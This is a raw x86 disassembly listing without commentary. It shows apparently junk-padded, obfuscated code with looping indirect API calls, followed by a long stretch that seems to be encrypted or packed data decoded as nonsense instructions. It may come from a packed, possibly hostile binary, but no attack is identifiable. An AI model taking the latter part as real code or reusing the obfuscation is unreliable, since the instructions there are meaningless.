  40a463:	mov    eax,DWORD PTR [eax+0x198]
  40a469:	xor    edi,ecx
  40a46b:	mov    edx,0x3272dd
  40a470:	and    DWORD PTR ds:0x42b010,0x42d000
  40a47a:	add    edi,edx
  40a47c:	mov    DWORD PTR ds:0x429000,0x5af1
  40a486:	cmp    DWORD PTR [eax],edi
  40a488:	je     0x40a49f
  40a48e:	mov    DWORD PTR ds:0x429000,0x225c
  40a498:	mov    eax,DWORD PTR [eax]
  40a49a:	jmp    0x40cc18
  40a49f:	mov    eax,0x3847
  40a4a4:	mov    eax,DWORD PTR [ebp+0x18]
  40a4a7:	cmp    eax,esi
  40a4a9:	mov    DWORD PTR ds:0x429014,0x6496
  40a4b3:	jne    0x40a4d7
  40a4b9:	mov    DWORD PTR ds:0x42b000,0x18c7
  40a4c3:	push   0xf89c85b2
  40a4c8:	mov    DWORD PTR ds:0x42c014,0x18
  40a4d2:	jmp    0x40cc07
  40a4d7:	mov    esi,DWORD PTR [ebp+0x18]
  40a4da:	mov    DWORD PTR ds:0x42b000,ebx
  40a4e0:	mov    eax,0xf89c85b3
  40a4e5:	cmp    esi,eax
  40a4e7:	mov    DWORD PTR ds:0x42b008,0x2007
  40a4f1:	jne    0x40cbf7
  40a4f7:	mov    eax,ds:0x42c008
  40a4fc:	xor    DWORD PTR ds:0x429004,eax
  40a502:	mov    eax,DWORD PTR [ebp+0x10]
  40a505:	dec    esi
  40a506:	xor    eax,ecx
  40a508:	adc    esi,DWORD PTR ds:0x42d008
  40a50e:	add    eax,edx
  40a510:	xor    esi,esi
  40a512:	or     esi,DWORD PTR ds:0x42c008
  40a518:	adc    DWORD PTR ds:0x42d010,esi
  40a51e:	mov    DWORD PTR [ebp-0x18],eax
  40a521:	mov    eax,DWORD PTR [ebp+0xc]
  40a524:	adc    DWORD PTR ds:0x42d010,0x3da6
  40a52e:	mov    esi,DWORD PTR [ebp-0x8]
  40a531:	xor    eax,ecx
  40a533:	add    DWORD PTR ds:0x42d018,0x6859
  40a53d:	add    eax,edx
  40a53f:	imul   eax,DWORD PTR [esi]
  40a542:	mov    esi,DWORD PTR [ebp+0x8]
  40a545:	or     DWORD PTR ds:0x42d014,0x363e
  40a54f:	xor    esi,ecx
  40a551:	mov    DWORD PTR ds:0x42b010,0xc36
  40a55b:	add    esi,edx
  40a55d:	mov    DWORD PTR ds:0x42d010,0x490b
  40a567:	cmp    esi,eax
  40a569:	mov    eax,ds:0x42d018
  40a56e:	mov    eax,DWORD PTR [ebp-0x4]
  40a571:	push   ebx
  40a572:	mov    DWORD PTR ds:0x42a008,0x30a3
  40a57c:	je     0x40a688
  40a582:	mov    DWORD PTR ds:0x42d008,0x4e69
  40a58c:	mov    esi,DWORD PTR [ebp-0x18]
  40a58f:	or     DWORD PTR ds:0x42a01c,0x42c010
  40a599:	add    DWORD PTR [eax],esi
  40a59b:	mov    DWORD PTR ds:0x42b00c,0x14
  40a5a5:	cmp    DWORD PTR ds:0x42b00c,0x0
  40a5ac:	je     0x40a5f7
  40a5b2:	cmp    DWORD PTR ds:0x42b00c,0x3
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x42e0a1
  40a5c4:	push   0x42e035
  40a5c9:	call   DWORD PTR ds:0x42ed3d
  40a5cf:	cmp    DWORD PTR ds:0x42b00c,0x4
  40a5d6:	jne    0x40a5e7
  40a5dc:	mov    eax,ds:0x42b00c
  40a5e1:	dec    eax
  40a5e2:	mov    ds:0x42b00c,eax
  40a5e7:	mov    eax,ds:0x42b00c
  40a5ec:	dec    eax
  40a5ed:	mov    ds:0x42b00c,eax
  40a5f2:	jmp    0x40a5a5
  40a5f7:	mov    eax,DWORD PTR [ebp-0x4]
  40a5fa:	mov    DWORD PTR ds:0x42d004,0x12
  40a604:	cmp    DWORD PTR ds:0x42d004,0x0
  40a60b:	je     0x40a64f
  40a611:	cmp    DWORD PTR ds:0x42d004,0x21
  40a618:	jne    0x40a633
  40a61e:	push   0x5688
  40a623:	push   0x5318
  40a628:	push   0x314e
  40a62d:	call   DWORD PTR ds:0x42ed41
  40a633:	mov    esi,DWORD PTR ds:0x42d004
  40a639:	dec    esi
  40a63a:	mov    DWORD PTR ds:0x42d004,esi
  40a640:	jmp    0x40a604
  40a645:	sub    DWORD PTR ds:0x42c010,0x7728
  40a64f:	mov    esi,DWORD PTR [ebp+0xc]
  40a652:	add    DWORD PTR ds:0x42c018,0x42b00c
  40a65c:	xor    esi,ecx
  40a65e:	xor    DWORD PTR ds:0x429020,0x39e1
  40a668:	add    esi,edx
  40a66a:	xor    DWORD PTR ds:0x42b00c,0x429028
  40a674:	imul   esi,DWORD PTR [eax]
  40a677:	mov    DWORD PTR [eax],esi
  40a679:	mov    DWORD PTR ds:0x42d000,0x1b30
  40a683:	jmp    0x40a68f
  40a688:	and    edi,edi
  40a68a:	mov    esi,DWORD PTR [ebp+0x14]
  40a68d:	xor    DWORD PTR [eax],esi
  40a68f:	sbb    eax,edi
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	mov    DWORD PTR ds:0x429020,0x1e
  40a69e:	cmp    DWORD PTR ds:0x429020,0x0
  40a6a5:	je     0x40a6f7
  40a6ab:	cmp    DWORD PTR ds:0x429020,0xf
  40a6b2:	jne    0x40a6cb
  40a6b8:	push   DWORD PTR [ebp-0x24]
  40a6bb:	push   0x42b000
  40a6c0:	push   0x2936
  40a6c5:	call   DWORD PTR ds:0x42ed45
  40a6cb:	cmp    DWORD PTR ds:0x429020,0x10
  40a6d2:	jne    0x40a6e5
  40a6d8:	mov    esi,DWORD PTR ds:0x429020
  40a6de:	dec    esi
  40a6df:	mov    DWORD PTR ds:0x429020,esi
  40a6e5:	mov    esi,DWORD PTR ds:0x429020
  40a6eb:	dec    esi
  40a6ec:	mov    DWORD PTR ds:0x429020,esi
  40a6f2:	jmp    0x40a69e
  40a6f7:	mov    edi,DWORD PTR [ebp+0x10]
  40a6fa:	xor    edi,ecx
  40a6fc:	mov    esi,0xffcd8d23
  40a701:	mov    ebx,esi
  40a703:	sub    ebx,edi
  40a705:	jmp    0x40caae
  40a70a:	inc    ecx
  40a70b:	sbb    al,0x8b
  40a70e:	fwait
  40a70f:	jnp    0x40a702
  40a711:	mov    BYTE PTR [ebx-0x7fa83f7d],bl
  40a717:	cs mov edi,ds
  40a71a:	ins    DWORD PTR es:[edi],dx
  40a71b:	add    al,0x7a
  40a71d:	jp     0x40a705
  40a71f:	pop    edi
  40a720:	jp     0x40a79c
  40a722:	or     ecx,eax
  40a724:	repnz mov dl,0x71
  40a727:	sbb    BYTE PTR [edx],bl
  40a729:	add    edx,DWORD PTR [ebp+0xd]
  40a72c:	fwait
  40a72d:	sar    edi,1
  40a72f:	or     ebx,DWORD PTR [ebp-0x1def9d5]
  40a735:	stos   DWORD PTR es:[edi],eax
  40a736:	jo     0x40a78f
  40a738:	xchg   ecx,eax
  40a739:	das    
  40a73a:	jge    0x40a712
  40a73c:	ja     0x40a6e2
  40a73e:	pop    ebx
  40a73f:	test   edi,edi
  40a741:	mov    bl,0xdf
  40a743:	mov    ebp,DWORD PTR [eax+eiz*4+0x30004b5f]
  40a74a:	dec    esp
  40a74b:	xor    ebp,DWORD PTR [esi]
  40a74d:	popa   
  40a74e:	dec    eax
  40a74f:	daa    
  40a750:	fidiv  WORD PTR [edi-0x69]
  40a753:	pop    esi
  40a754:	jnp    0x40a756
  40a756:	test   BYTE PTR [esi],ah
  40a758:	imul   edx,eax,0x25
  40a75b:	sbb    al,0xe5
  40a75d:	shr    BYTE PTR [eax],1
  40a75f:	cmp    ebx,DWORD PTR [ebx+0x35d1f276]
  40a765:	lds    ebx,FWORD PTR [ebp-0x219e76a1]
  40a76b:	sbb    esi,esi
  40a76d:	or     DWORD PTR [ebp-0x47],0xffffff8d
  40a771:	inc    ebp
  40a772:	in     eax,dx
  40a773:	add    BYTE PTR [edx],ch
  40a775:	or     dl,BYTE PTR [ebx+edi*1+0xf]
  40a779:	pop    ax
  40a77b:	and    ebp,DWORD PTR [ebp+0x10]
  40a77e:	push   0xa93d58ef
  40a783:	retf   
  40a784:	mov    BYTE PTR [eax],bh
  40a786:	leave  
  40a787:	mov    esp,ecx
  40a789:	adc    edi,DWORD PTR [ecx]
  40a78b:	cmp    DWORD PTR [ecx-0x1f02ca3e],esi
  40a791:	dec    ebp
  40a792:	xor    DWORD PTR [edx],edx
  40a794:	ins    DWORD PTR es:[edi],dx
  40a795:	scas   al,BYTE PTR es:[edi]
  40a796:	dec    cx
  40a798:	fdivr  QWORD PTR [edi-0xa]
  40a79b:	push   edi
  40a79c:	ins    DWORD PTR es:[edi],dx
  40a79d:	pop    eax
  40a79e:	mov    edx,0x535399e3
  40a7a3:	sahf   
  40a7a4:	add    ch,BYTE PTR [ebp+0x35e0de0]
  40a7aa:	mov    ah,0xe
  40a7ac:	popf   
  40a7ad:	addr16 jno 0x40a7d5
  40a7b0:	pusha  
  40a7b1:	scas   al,BYTE PTR es:[edi]
  40a7b2:	xor    al,0xa
  40a7b4:	xchg   ebp,eax
  40a7b5:	test   DWORD PTR [ebx+0x1],ebp
  40a7b8:	addr16 out dx,al
  40a7ba:	sub    eax,0xf852ae4e
  40a7bf:	pop    esp
  40a7c0:	dec    edi
  40a7c1:	fst    DWORD PTR [edx]
  40a7c3:	gs shl dl,1
  40a7c6:	xor    DWORD PTR [edx],0xcab8b1de
  40a7cc:	pop    ebp
  40a7cd:	xchg   ebp,eax
  40a7ce:	push   ebx
  40a7cf:	mov    DWORD PTR [edx],esi
  40a7d1:	mov    esp,0xde0c550c
  40a7d6:	outs   dx,DWORD PTR ds:[esi]
  40a7d7:	pop    edx
  40a7d8:	xor    al,0xf7
  40a7da:	mov    DWORD PTR [edi],ebp
  40a7dc:	mov    dl,0x7a
  40a7de:	ret    0x94dd
  40a7e1:	cmp    DWORD PTR [edi+ebx*1],eax
  40a7e4:	mov    dh,BYTE PTR [edi-0x5c]
  40a7e7:	stc    
  40a7e8:	retf   0x9316
  40a7eb:	mov    bl,0x34
  40a7ed:	(bad)  
  40a7ee:	cmc    
  40a7ef:	adc    eax,0x604243d9
  40a7f4:	lods   eax,DWORD PTR ds:[esi]
  40a7f5:	push   ss
  40a7f6:	cmp    BYTE PTR [eax-0x6a],dl
  40a7f9:	icebp  
  40a7fa:	jb     0x40a7af
  40a7fc:	jl     0x40a7ab
  40a7fe:	and    edi,DWORD PTR [ebx]
  40a800:	out    dx,al
  40a801:	push   ss
  40a802:	inc    edi
  40a803:	scas   eax,DWORD PTR es:[edi]
  40a804:	fbld   TBYTE PTR [ecx+0x34f7ae23]
  40a80a:	cmc    
  40a80b:	inc    eax
  40a80c:	push   esp
  40a80d:	jnp    0x40a840
  40a80f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a810:	iret   
  40a811:	call   0x19292083
  40a816:	sbb    al,0x88
  40a818:	enter  0x8e7f,0xd2
  40a81c:	add    DWORD PTR [edi-0x43],ecx
  40a81f:	xchg   edx,eax
  40a820:	and    edi,ebp
  40a822:	bound  di,DWORD PTR [edx]
  40a825:	shr    BYTE PTR [esi+0x74],0x1a
  40a829:	xlat   BYTE PTR ds:[ebx]
  40a82a:	and    DWORD PTR [edx+0x2253ae20],eax
  40a830:	loopne 0x40a837
  40a832:	push   ss
  40a833:	mov    dh,0xea
  40a835:	div    ecx
  40a837:	enter  0x7d2a,0x1d
  40a83b:	jle    0x40a7d4
  40a83d:	adc    esi,0x3d
  40a840:	fiadd  WORD PTR [esi-0x48cfc407]
  40a846:	pop    esi
  40a847:	jae    0x40a87d
  40a849:	out    dx,eax
  40a84a:	loop   0x40a817
  40a84c:	mov    ebx,0x6651f413
  40a851:	daa    
  40a852:	dec    eax
  40a853:	xchg   edi,eax
  40a854:	xor    DWORD PTR [edi-0x50],ebp
  40a857:	mov    dh,0x9a
  40a859:	mov    es,WORD PTR [esi-0x50b5c723]
  40a85f:	jmp    0xdd41:0xf795eb6f
  40a866:	pop    esi
  40a867:	jo     0x40a8b4
  40a869:	pop    ss
  40a86a:	or     DWORD PTR [edx+0xa6a89d3],0xfc7067a
  40a874:	sbb    ecx,ecx
  40a876:	mov    ebp,0xed5557cb
  40a87b:	and    al,0x2e
  40a87d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a87e:	mov    esp,0x1e468e99
  40a883:	shr    BYTE PTR [eax-0x9612a6f],1
  40a889:	lods   eax,DWORD PTR ds:[esi]
  40a88a:	or     DWORD PTR [ebp-0x3c83a286],esi
  40a890:	push   0x73
  40a892:	sbb    ebp,DWORD PTR ds:0x94a9d599
  40a898:	lahf   
  40a899:	mov    ebp,eax
  40a89b:	ror    BYTE PTR [ecx-0x24a2c6d1],0xe7
  40a8a2:	stos   DWORD PTR es:[edi],eax
  40a8a3:	cmp    eax,0xf6e9e2aa
  40a8a8:	or     BYTE PTR [esi+eax*1],ch
  40a8ab:	lds    ecx,FWORD PTR [edx-0x6b80bf4c]
  40a8b1:	test   bh,bh
  40a8b3:	hlt    
  40a8b4:	test   BYTE PTR [edx+eax*1+0xa],ch
  40a8b8:	call   0xe7a50ce1
  40a8bd:	fisub  DWORD PTR [esi+0x7b9a98c4]
  40a8c3:	(bad)  
  40a8c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8c5:	xchg   ecx,ecx
  40a8c7:	xor    bh,BYTE PTR [edx-0x1707249e]
  40a8cd:	push   edi
  40a8ce:	dec    edx
  40a8cf:	pop    es
  40a8d0:	jno    0x40a91f
  40a8d2:	xchg   ecx,eax
  40a8d3:	nop
  40a8d4:	test   DWORD PTR [esi+0x547f0820],esp
  40a8da:	add    bh,al
  40a8dc:	xchg   DWORD PTR [edx+0x53fb4e61],edx
  40a8e2:	test   ebx,edi
  40a8e4:	or     eax,0x6e835de
  40a8e9:	mov    edx,0x78b54705
  40a8ee:	fisttp WORD PTR [ecx-0x11]
  40a8f1:	xor    eax,0xb1eaf7b6
  40a8f6:	and    BYTE PTR [esi],0x9c
  40a8f9:	and    BYTE PTR [edi+eax*2-0x1c34f554],bh
  40a900:	ins    DWORD PTR es:[edi],dx
  40a901:	cmp    eax,0x3f0106ad
  40a906:	jle    0x40a8f2
  40a908:	out    0x79,eax
  40a90a:	pushf  
  40a90b:	cmp    eax,0x6eb0ab5
  40a910:	sbb    al,0x18
  40a912:	dec    esp
  40a913:	cmp    bh,BYTE PTR [esi]
  40a915:	repz pop eax
  40a917:	je     0x40a8a3
  40a919:	push   ds
  40a91a:	(bad)  
  40a91b:	adc    BYTE PTR [esi+0x2b],bl
  40a91e:	lods   al,BYTE PTR ds:[esi]
  40a91f:	loope  0x40a8c2
  40a921:	cmp    al,0x7d
  40a923:	push   ecx
  40a924:	jae    0x40a98c
  40a926:	enter  0xf324,0xa8
  40a92a:	inc    ecx
  40a92b:	dec    ebp
  40a92c:	push   esi
  40a92d:	test   al,0x66
  40a92f:	jle    0x40a954
  40a931:	jmp    DWORD PTR [edx+0x192d066]
  40a937:	and    al,0xf8
  40a939:	repz jbe 0x40a924
  40a93c:	sbb    eax,0x9e700118
  40a941:	sub    BYTE PTR [eax],dh
  40a943:	mov    bh,BYTE PTR [ecx+0xb2dd882]
  40a949:	dec    ebx
  40a94a:	push   ds
  40a94b:	fadd   DWORD PTR [ecx]
  40a94d:	dec    esi
  40a94e:	fmul   QWORD PTR [edi]
  40a950:	dec    esp
  40a951:	sub    ecx,DWORD PTR [ecx+0x76]
  40a954:	add    cl,bh
  40a956:	pop    es
  40a957:	adc    BYTE PTR [eax+0xb],al
  40a95a:	fwait
  40a95b:	dec    esp
  40a95c:	dec    ebx
  40a95d:	sar    dh,0xbf
  40a960:	xor    esi,DWORD PTR [edx-0x5bdbecec]
  40a966:	shr    BYTE PTR [eax-0x68],cl
  40a969:	jl     0x40a8ff
  40a96b:	inc    esp
  40a96c:	popa   
  40a96d:	cwde   
  40a96e:	push   ecx
  40a96f:	jnp    0x40a95b
  40a971:	dec    ebx
  40a972:	push   0x98feb1b5
  40a977:	cmp    al,0xab
  40a979:	stos   DWORD PTR es:[edi],eax
  40a97a:	popa   
  40a97b:	push   ebx
  40a97c:	mov    ah,0x9
  40a97e:	hlt    
  40a97f:	test   dh,dl
  40a981:	cmp    DWORD PTR [ebp-0x71],ebp
  40a984:	scas   al,BYTE PTR es:[edi]
  40a985:	inc    eax
  40a986:	addr16 mov ah,0x78
  40a989:	in     al,0x7b
  40a98b:	inc    esi
  40a98c:	jo     0x40a952
  40a98e:	jns    0x40a960
  40a990:	ror    DWORD PTR [ebx+0x1e],cl
  40a993:	push   ebx
  40a994:	les    edi,FWORD PTR [ecx]
  40a996:	jecxz  0x40a981
  40a998:	xor    eax,0x49a31cfc
  40a99d:	stc    
  40a99e:	mov    ebx,0x470385
  40a9a3:	(bad)
  40a9a6:	cdq    
  40a9a7:	and    bl,dh
  40a9a9:	gs loopne 0x40a9de
  40a9ac:	jae    0x40a941
  40a9ae:	cmp    esi,esi
  40a9b0:	jnp    0x40a95a
  40a9b2:	mov    al,ds:0x436847c1
  40a9b7:	pop    ss
  40a9b8:	jo     0x40aa04
  40a9ba:	mov    esi,0x650b08e7
  40a9bf:	iret   
  40a9c0:	jg     0x40a9d3
  40a9c2:	push   ss
  40a9c3:	mov    BYTE PTR ds:0xdd3854d9,0x6e
  40a9ca:	loopne 0x40a991
  40a9cc:	jno    0x40a970
  40a9ce:	xchg   BYTE PTR [edx+ebx*4+0x41],bl
  40a9d2:	dec    edx
  40a9d3:	sub    eax,0xce1d6fd7
  40a9d8:	and    eax,0x5ca1dc85
  40a9dd:	jns    0x40aa1f
  40a9df:	pop    ebp
  40a9e0:	aaa    
  40a9e1:	push   edi
  40a9e2:	mov    ebx,0x2042f97c
  40a9e7:	add    DWORD PTR [esi+ecx*1-0x4c53cd7b],0xfa10b341
  40a9f2:	mov    ch,0xef
  40a9f4:	test   DWORD PTR [esp+ebx*8],edx
  40a9f7:	cmp    BYTE PTR [edi-0x3d],bl
  40a9fa:	loop   0x40a9bf
  40a9fc:	(bad)  
  40a9fd:	add    al,0x56
  40a9ff:	jl     0x40a9d8
  40aa01:	mov    bh,0x99
  40aa03:	bound  esi,QWORD PTR [edi+0x63]
  40aa06:	jnp    0x40a98e
  40aa08:	adc    eax,0x2c24dad4
  40aa0d:	jns    0x40a9d7
  40aa0f:	aam    0x33
  40aa11:	inc    esp
  40aa12:	repnz xchg ax,ax
  40aa15:	push   0x36
  40aa17:	dec    esp
  40aa18:	rcr    DWORD PTR [ecx],cl
  40aa1a:	add    eax,0xcc282dc7
  40aa1f:	les    ecx,FWORD PTR [ebp+eiz*8+0x2a144b1d]
  40aa26:	in     al,0x73
  40aa28:	ds test al,0xee
  40aa2b:	mov    ecx,0xd0f19dcc
  40aa30:	sahf   
  40aa31:	jae    0x40aa38
  40aa33:	jnp    0x40a9f5
  40aa35:	fmul   st,st(4)
  40aa37:	xchg   DWORD PTR [eax+0x38],eax
  40aa3a:	jb     0x40a9f5
  40aa3c:	mov    esp,0x2a36cc0a
  40aa41:	xchg   esp,eax
  40aa42:	push   ebp
  40aa43:	out    0xdc,eax
  40aa45:	jp     0x40aa8e
  40aa47:	jp     0x40a9dd
  40aa49:	jno    0x40aa42
  40aa4b:	inc    eax
  40aa4c:	ss mov bh,bl
  40aa4f:	lahf   
  40aa50:	add    cl,BYTE PTR [eax-0xc366680]
  40aa56:	inc    ebx
  40aa57:	popa   
  40aa58:	jecxz  0x40aa6b
  40aa5a:	jo     0x40a9dc
  40aa5c:	pushf  
  40aa5d:	or     eax,0x92b609a3
  40aa63:	daa    
  40aa64:	retf   
  40aa65:	rcr    DWORD PTR [ebx+0x25],1
  40aa68:	retf   
  40aa69:	mov    al,ds:0xb0b17615
  40aa6e:	aas    
  40aa6f:	jmp    0x5afa8508
  40aa74:	jmp    0xf39c9e30
  40aa79:	sub    al,bh
  40aa7b:	push   ecx
  40aa7c:	in     al,0xac
  40aa7e:	sub    esp,edi
  40aa80:	aad    0x94
  40aa82:	push   es
  40aa83:	inc    esi
  40aa84:	stc    
  40aa85:	shl    DWORD PTR [eax],cl
  40aa87:	retf   0xaef2
  40aa8a:	push   es
  40aa8b:	loope  0x40aa11
  40aa8d:	bound  edx,QWORD PTR [edi]
  40aa8f:	icebp  
  40aa90:	ds scas al,BYTE PTR es:[edi]
  40aa92:	dec    edi
  40aa93:	ret    0x86c2
  40aa96:	mov    eax,0xb53683ed
  40aa9b:	jnp    0x40aafa
  40aa9d:	inc    esi
  40aa9e:	and    DWORD PTR [ebp-0x78a6b014],eax
  40aaa4:	mov    edi,0xc7a5e9b4
  40aaa9:	dec    edx
  40aaaa:	int    0xbb
  40aaac:	stc    
  40aaad:	mov    WORD PTR [edi],ss
  40aaaf:	repnz aaa 
  40aab1:	sub    eax,edx
  40aab3:	jl     0x40aa81
  40aab5:	xchg   ecx,eax
  40aab6:	push   cs
  40aab7:	add    DWORD PTR [ecx+0x2d],ecx
  40aaba:	mov    DWORD PTR [eax+0x3441cedb],ebp
  40aac0:	jp     0x40aac5
  40aac2:	cmc    
  40aac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aac4:	pop    esi
  40aac5:	dec    ebx
  40aac6:	xchg   BYTE PTR [ebx+0x63],bl
  40aac9:	aad    0x60
  40aacb:	xchg   BYTE PTR [edx+0x6ec3a6e],bh
  40aad1:	call   0xa38d:0x403510eb
  40aad8:	fsincos 
  40aada:	mov    dh,0x5c
  40aadc:	lock sub al,0xca
  40aadf:	mov    al,0x90
  40aae1:	push   ss
  40aae2:	mov    DWORD PTR [ebx-0x4b],eax
  40aae5:	cwde   
  40aae6:	call   0x3fd58675
  40aaeb:	or     ebx,DWORD PTR [ebx+0x64bbc3cb]
  40aaf1:	sbb    ah,BYTE PTR [esi]
  40aaf3:	daa    
  40aaf4:	pop    ss
  40aaf5:	push   0xae1fddbd
  40aafa:	xor    BYTE PTR [ebx+edx*4],dl
  40aafd:	dec    BYTE PTR [eax-0x3f9de92b]
  40ab03:	jmp    0xa862:0xdca08220
  40ab0a:	int    0x9b
  40ab0c:	mov    dl,0x26
  40ab0e:	fild   WORD PTR [ebp-0x15]
  40ab11:	push   edi
  40ab12:	clc    
  40ab13:	sub    al,0x42
  40ab15:	je     0x40aafc
  40ab17:	or     al,0x33
  40ab19:	icebp  
  40ab1a:	push   cs
  40ab1b:	sub    eax,0x9bb36606
  40ab20:	cli    
  40ab21:	(bad)  
  40ab22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab23:	mov    esp,0x741da0fb
  40ab28:	out    0x7,al
  40ab2a:	push   es
  40ab2b:	in     al,0x60
  40ab2d:	push   esp
  40ab2e:	xchg   esi,eax
  40ab2f:	push   eax
  40ab30:	cmp    al,BYTE PTR [eax+0x37b3ccc0]
  40ab36:	inc    edi
  40ab37:	lods   al,BYTE PTR ds:[esi]
  40ab38:	xchg   ebp,eax
  40ab3a:	dec    esp
  40ab3b:	idiv   bh
  40ab3d:	mov    ah,0x7a
  40ab3f:	mov    eax,cr7
  40ab42:	outs   dx,BYTE PTR ds:[esi]
  40ab43:	fwait
  40ab44:	addr16 cmp eax,0x21f51219
  40ab4a:	and    eax,0x96577e47
  40ab4f:	loop   0x40abb9
  40ab51:	enter  0x9c41,0xf2
  40ab55:	cmp    BYTE PTR [edx+0x3e4f6b0d],cl
  40ab5b:	jg     0x40ab3a
  40ab5d:	cmp    eax,DWORD PTR [ebp+0x56]
  40ab60:	dec    edi
  40ab61:	and    al,0xb2
  40ab63:	jne    0x40ab88
  40ab65:	push   edi
  40ab66:	popa   
  40ab67:	mov    al,ds:0x22970fee
  40ab6c:	adc    al,0x8c
  40ab6e:	jb     0x40aafe
  40ab70:	mov    al,0x3b
  40ab72:	(bad)  
  40ab73:	jmp    0x22b062e1
  40ab78:	and    ch,BYTE PTR [ebx-0x718d4996]
  40ab7e:	fld    DWORD PTR [eax]
  40ab80:	dec    esp
  40ab81:	sbb    DWORD PTR [edi+0x16c8498d],edx
  40ab87:	idiv   BYTE PTR [edi+0x3]
  40ab8a:	retf   
  40ab8b:	scas   al,BYTE PTR es:[edi]
  40ab8c:	push   0x1
  40ab8e:	xchg   BYTE PTR [esi-0x4d],ch
  40ab91:	inc    ecx
  40ab92:	push   edi
  40ab93:	into   
  40ab94:	push   edx
  40ab95:	jp     0x40ab96
  40ab97:	repz push ds
  40ab99:	mov    ss,WORD PTR [edx-0x75]
  40ab9c:	xor    ecx,esp
  40ab9e:	pop    esi
  40ab9f:	rcr    DWORD PTR [eax-0x7b8cc9cb],cl
  40aba5:	shl    BYTE PTR [edx+0x6726f9a3],cl
  40abab:	pop    es
  40abac:	fcomip st,st(6)
  40abae:	and    eax,0x6aafd87
  40abb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb4:	ja     0x40abf8
  40abb6:	or     DWORD PTR [eax+0xb59fe0a],esi
  40abbc:	clc    
  40abbd:	out    0x7e,al
  40abbf:	sahf   
  40abc0:	add    DWORD PTR [eax],edi
  40abc2:	cmp    eax,0xfb21aa63
  40abc7:	push   es
  40abc8:	mov    edi,0xf8de2202
  40abcd:	call   0x7f6:0xeb25377e
  40abd4:	xchg   ebx,ecx
  40abd6:	fldl2e 
  40abd8:	dec    esp
  40abd9:	das    
  40abda:	add    al,0xfe
  40abdc:	dec    ecx
  40abdd:	sar    BYTE PTR ds:0x666464e4,1
  40abe3:	lea    edi,[esi+0x664a2629]
  40abe9:	adc    ecx,DWORD PTR [esi-0x54ef1fa9]
  40abef:	mov    dl,0x78
  40abf1:	mov    bl,0x35
  40abf3:	fadd   st(6),st
  40abf5:	sbb    esp,DWORD PTR [esi-0x4c]
  40abf8:	test   BYTE PTR [edx],bh
  40abfa:	mov    bl,0x55
  40abfc:	cmp    ah,BYTE PTR [edi+0x5ffe0326]
  40ac02:	inc    ecx
  40ac03:	aad    0x3c
  40ac05:	mov    DWORD PTR [ebp-0x147ce8f],ebp
  40ac0b:	mov    eax,ds:0x8bceab76
  40ac10:	nop
  40ac11:	jo     0x40ac22
  40ac13:	and    eax,0x17ceaea
  40ac18:	sub    ebp,ebx
  40ac1a:	mov    ?,WORD PTR [ecx+eiz*1]
  40ac1d:	loope  0x40ac54
  40ac1f:	imul   edi,DWORD PTR [esi],0x3b406bcf
  40ac25:	push   0x1b
  40ac27:	cwde   
  40ac28:	jle    0x40ac45
  40ac2a:	mov    ds:0x7e373969,eax
  40ac2f:	push   ds
  40ac30:	jno    0x40aca3
  40ac32:	or     eax,0x9a0ff3de
  40ac37:	inc    eax
  40ac38:	xor    BYTE PTR [edx],dl
  40ac3a:	das    
  40ac3b:	push   0x1c78449d
  40ac40:	dec    esp
  40ac41:	mov    ds,esp
  40ac43:	sti    
  40ac44:	dec    esi
  40ac45:	popf   
  40ac46:	ud1    ecx,DWORD PTR [ebx]
  40ac49:	jo     0x40ac8d
  40ac4b:	push   esp
  40ac4c:	repz sahf 
  40ac4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac4f:	inc    edi
  40ac50:	pushf  
  40ac51:	call   0xb5bc6a5d
  40ac56:	mov    al,0x93
  40ac58:	es (bad) 
  40ac5c:	and    al,0x24
  40ac5e:	xor    edi,DWORD PTR [edx+ebx*2-0x3d]
  40ac62:	lock outs dx,BYTE PTR ds:[esi]
  40ac64:	gs push ds
  40ac66:	adc    al,0x92
  40ac68:	push   ss
  40ac69:	fisub  DWORD PTR [ebx+0x7c]
  40ac6c:	dec    edi
  40ac6d:	pop    esi
  40ac6e:	sbb    eax,0x117128af
  40ac73:	push   eax
  40ac74:	xor    eax,0x4325873d
  40ac79:	jne    0x40ac98
  40ac7b:	inc    edx
  40ac7c:	out    0x7b,eax
  40ac7e:	jae    0x40ace7
  40ac80:	dec    eax
  40ac81:	dec    ecx
  40ac82:	stos   BYTE PTR es:[edi],al
  40ac83:	sbb    DWORD PTR [eax+ebp*8],ebx
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	mov    edx,0xd2fd3318
  40ac8c:	inc    ebx
  40ac8d:	in     eax,dx
  40ac8e:	shl    edi,1
  40ac90:	mov    BYTE PTR [eax+0x60],al
  40ac93:	inc    ebp
  40ac94:	mov    ch,0x4b
  40ac96:	pusha  
  40ac97:	xor    BYTE PTR [ebp-0x1c51cc0d],bl
  40ac9d:	jmp    0x40ac2c
  40ac9f:	mov    esi,0x885f7332
  40aca4:	inc    edi
  40aca5:	aaa    
  40aca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aca7:	cmp    esp,0x26c27144
  40acad:	aad    0x98
  40acaf:	push   cs
  40acb0:	jmp    0x909e:0x4009197a
  40acb7:	add    al,0x1e
  40acb9:	inc    ebx
  40acba:	rcr    edx,cl
  40acbc:	mov    cl,0x51
  40acbe:	cmp    eax,0x3ffdfdfb
  40acc3:	(bad)  
  40acc4:	out    0x3a,eax
  40acc6:	dec    esp
  40acc7:	add    BYTE PTR [edi-0x69],dh
  40acca:	(bad)  
  40accb:	out    0xb3,al
  40accd:	and    eax,0x70cb497f
  40acd2:	cmp    BYTE PTR [ecx],0xd
  40acd5:	mov    esp,0x3c79a42a
  40acda:	inc    esi
  40acdb:	jmp    0xe251:0x76bc393f
  40ace2:	frstor [ebp-0x5bf5acd0]
  40ace8:	popf   
  40ace9:	js     0x40ad5a
  40aceb:	and    DWORD PTR [edi],esp
  40aced:	add    bl,ch
  40acef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acf0:	out    dx,al
  40acf1:	(bad)  
  40acf2:	jp     0x40ad4c
  40acf4:	mov    bh,0xb6
  40acf6:	lods   eax,DWORD PTR ds:[esi]
